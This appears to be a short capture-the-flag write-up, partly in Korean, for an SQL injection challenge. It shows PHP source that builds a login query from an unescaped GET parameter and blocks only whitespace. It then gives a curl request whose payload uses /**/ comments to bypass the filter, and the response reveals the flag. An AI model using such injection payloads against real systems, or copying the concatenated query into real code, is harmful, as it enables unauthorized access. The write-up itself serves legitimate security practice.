# Sql World 1
web.isangxcaution.xyz:20300/sql1.php

Made by smart_kang

```php
<?php
    include "./config.php";
    $db = $link;
    $pw = '';
    if(isset($_GET['pw'])){
        $pw = $_GET['pw'];
        if(preg_match('/[[:space:]]/i', $_GET['pw'])) exit("No whitespace ~_~"); 
    }
    $query = "select id from sql1 where id='admin' and pw='$pw'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo $FLAG1;
    highlight_file(__FILE__);

?>
```

whitespace filtering 을 bypass 하기 위해 주석을 사용하면 된다. 
```sh
❯ curl http://web.isangxcaution.xyz:20300/sql1.php\?pw\=%27/\*\*/or/\*\*/%27%27\=%27
<hr>query : <strong>select id from sql1 where id='admin' and pw=''/**/or/**/''=''</strong><hr><br><br><h2>FLAG : IxC{Y0u_kn0w_h0w_t0_bypass_spac3!!}</h2><br><code><span style="color: #000000">
```
